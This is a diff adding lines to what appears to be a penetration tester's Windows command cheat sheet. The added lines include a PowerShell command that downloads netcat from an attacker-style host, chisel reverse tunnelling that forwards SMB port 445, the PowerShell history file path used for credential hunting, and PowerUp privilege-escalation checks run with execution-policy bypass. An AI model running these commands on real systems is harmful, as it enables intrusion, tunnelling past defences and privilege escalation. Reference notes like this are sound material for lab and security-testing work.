@@ -79,6 +79,8 @@ powershell Invode-WebRequest -Uri http://10.10.10.10/myshell.ps1
 # download with powershell
 powershell IWR -Uri http://10.10.10.10/nc.exe -OutFile C:\\windows\\temp\\nc.exe
 
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/nc.exe','nc.exe')"
+
 get-ChildName -recurse . | select fullname
 gci -recurse . | select fullname
 
@@ -101,3 +103,18 @@ certutil -decode infile outfile
 # list vhd files 
 7z l file.vhd
 
+# chisel port forwarding
+./chisel_linux_amd64 server --auth user:pass --reverse -p 443
+chisel.exe client --auth user:pass 1.2.3.4:443 R:445:127.0.0.1:445
+
+# windows powershell command history (file path)
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# using powerup (https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+powershell.exe -nop -exec bypass
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+
+# check and read NTFS alternate file streams
+get-item -force -path file_name.txt -stream *
+get-content -force -path file_name.txt -stream alternate_ntfs_stream.txt
